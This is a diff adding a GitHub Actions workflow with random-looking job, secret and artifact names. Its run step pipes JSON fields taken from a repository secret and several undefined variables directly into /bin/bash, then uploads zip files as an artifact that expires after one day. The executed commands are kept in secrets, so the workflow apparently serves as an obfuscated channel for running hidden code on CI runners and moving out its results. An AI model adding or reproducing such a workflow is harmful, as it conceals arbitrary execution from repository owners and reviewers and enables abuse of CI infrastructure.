@@ -1,0 +1,25 @@
+name: apacheuql138
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: apacheuql138
+        env:
+          ily36905: ${{ secrets.ily36905 }}
+        run: |
+          printf '%s' "$ily36905" | jq -r .vpghb31744 | /bin/bash
+          echo $m5 | jq -r .pa16 | /bin/bash
+          printf '%s' "$zjzyf651" | jq -r .je0430 | /bin/bash
+          printf '%s' "$qcglg2052" | jq -r .ylj0 | /bin/bash
+          echo $zxpvj82 | jq -r .xwv504 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WJBR8rJB
+          path: "*.zip"
+          retention-days: 1
